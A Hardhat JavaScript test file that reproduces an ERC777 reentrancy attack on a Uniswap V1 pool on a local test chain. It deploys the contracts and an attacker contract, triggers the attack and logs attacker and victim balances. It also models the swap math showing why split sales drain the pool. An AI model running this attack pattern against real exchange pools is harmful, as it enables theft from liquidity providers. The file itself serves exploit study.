const {expect} = require("chai");
const { BigNumber } = require("ethers");
const {ethers, network, waffle} = require("hardhat");
require("@nomiclabs/hardhat-waffle");
const util = require("../utils/utils");

const provider = waffle.provider;

describe("reentrancy attack",  function() {
    var deployer, attacker;
    const ercPoolAmount = ethers.utils.parseUnits("1000", 18);//by default demical is 18
    const ethPoolAmount = ethers.utils.parseUnits("1000","ether");
    const attackEth =  ethers.utils.parseUnits("100",18);
    var erc1820, erc777, uniV1;

    //Prepares
    before(async function(){
        [deployer, attacker] = await ethers.getSigners();
        //Deploy ERC1820
        erc1820 = await util.deploy1820(deployer);
        //Deploy ERC777
        erc777 = await util.deployErc777(deployer);
        //Deploy Uniswap V1 and add liquidities
        uniV1 = await util.deployUniV1(deployer, erc777);
        //Add liquidity 
        await (await erc777.connect(deployer).mint(deployer.address, ercPoolAmount, [], [])).wait();
        await (await erc777.connect(deployer).approve(uniV1.address, ercPoolAmount)).wait();
        await (await uniV1.connect(deployer).addLiquidity(ercPoolAmount, {value: ethPoolAmount})).wait();
    });
 
    it("reentrancy attack ", async function(){
        // Check liquidity pool count
        let ethPoolBefore = await provider.getBalance(uniV1.address);
        let erc777PoolBefore = await erc777.balanceOf(uniV1.address);

        console.log('Before attack:');
        console.log(`[hacker]eth balance: ${ethers.utils.formatEther(await provider.getBalance(attacker.address))} ether` );
        console.log(`[hacker]token balance: ${ethers.utils.formatUnits(await erc777.balanceOf(attacker.address), 18)} imBTC`);
        console.log(`[victim]eth pool: ${ethers.utils.formatEther(ethPoolBefore)} ether`);
        console.log(`[victim]erc777 pool: ${ethers.utils.formatUnits(erc777PoolBefore, 18)} imBTC`);
        // Attacker deploy attacker contract
        let AttackerContract = await ethers.getContractFactory('AttackerContract', attacker);
        let attackerContract = await AttackerContract.deploy(uniV1.address, erc777.address, erc1820.address);
        await attackerContract.deployed();
        // Attacker allows uniswap to operate his money
        await (await attackerContract.connect(attacker).prepare()).wait();
        // Attacker trigger attack
        for (i=0;i<1;i++) {
            await (await attackerContract.connect(attacker).trigger({value:attackEth})).wait();
        }
        await (await attackerContract.connect(attacker).withdraw()).wait();
        // Result
        let ethPoolAfter = await provider.getBalance(uniV1.address);
        let erc777PoolAfter = await erc777.balanceOf(uniV1.address);
        console.log('After attack:');
        console.log(`[hacker]eth balance: ${ethers.utils.formatEther(await provider.getBalance(attacker.address))} ether` );
        console.log(`[hacker]token balance: ${ethers.utils.formatUnits(await erc777.balanceOf(attacker.address), 18)} imBTC`);
        console.log(`[victim]eth pool: ${ethers.utils.formatEther(ethPoolAfter)} ether`);
        console.log(`[victim]erc777 pool: ${ethers.utils.formatUnits(erc777PoolAfter, 18)} imBTC`);
    });

    const poolXRaw = '1000'; //ImBTC count
    const poolYRaw = '1000'; //Ether count
    const xSoldRaw = '10'; //ImBTC sold
    const attackSplits = 10;
    it("analysis - normal", async function() {
        let poolX = ethers.utils.parseUnits(poolXRaw, 18);
        let poolY = ethers.utils.parseUnits(poolYRaw, 18);
        let xSold = ethers.utils.parseUnits(xSoldRaw, 18);

        console.log(`[Before swap]poolX: ${ethers.utils.formatUnits(poolX,18)}`);
        console.log(`[Before  swap]poolY: ${ethers.utils.formatUnits(poolY,18)}`);
        let yBoughts = [];
        let sum = BigNumber.from(0);
        for (var i =0;i<attackSplits;i++) {
            let partX =  xSold.div(attackSplits);
            let bought = inputToOutput(poolX, poolY,partX);
            poolY = poolY.sub(bought);
            poolX = poolX.add(partX);
            yBoughts.push(bought);
            sum = sum.add(bought);
        }

        console.log(`xSold: ${ethers.utils.formatUnits(xSold,18)}`);
        console.log('splits: ', attackSplits);
        console.log(`yBoughts:${ethers.utils.formatUnits(sum, 18)}`);
        for (var i =0;i<attackSplits;i++) {
            console.log('[yBought]',ethers.utils.formatUnits(yBoughts[i], 18));
        }
        console.log(`[After swap]poolX: ${ethers.utils.formatUnits(poolX,18)}`);
        console.log(`[After swap]poolY: ${ethers.utils.formatUnits(poolY,18)}`);
    });
    it("analysis - attack", async function() {
        let poolX = ethers.utils.parseUnits(poolXRaw, 18);
        let poolY = ethers.utils.parseUnits(poolYRaw, 18);
        let xSold = ethers.utils.parseUnits(xSoldRaw, 18);
        
        console.log(`[Before swap]poolX: ${ethers.utils.formatUnits(poolX,18)}`);
        console.log(`[Before  swap]poolY: ${ethers.utils.formatUnits(poolY,18)}`);
        let yBoughts = [];
        let sum = BigNumber.from(0);
        for (var i =0;i<attackSplits;i++) {
            let partX =  xSold.div(attackSplits);
            let bought = inputToOutput(poolX, poolY,partX);
            poolY = poolY.sub(bought);
            yBoughts.push(bought);
            sum = sum.add(bought);
        }
        poolX = poolX.add(xSold);//NOTE THIS!
        console.log(`xSold: ${ethers.utils.formatUnits(xSold,18)}`);
        console.log('splits: ',attackSplits);
        console.log(`yBoughts:${ethers.utils.formatUnits(sum, 18)}`);
        for (var i =0;i<attackSplits;i++) {
            console.log('[yBought]',ethers.utils.formatUnits(yBoughts[i], 18));
        }
        console.log(`[After swap]poolX: ${ethers.utils.formatUnits(poolX,18)}`);
        console.log(`[After swap]poolY: ${ethers.utils.formatUnits(poolY,18)}`);
    });
});

function inputToOutput(poolX, poolY, xSold) {
    //Fee is ignored
    let nominator = xSold.mul(poolY);
    let denominator = poolX.add(xSold);
    return nominator.div(denominator);
}


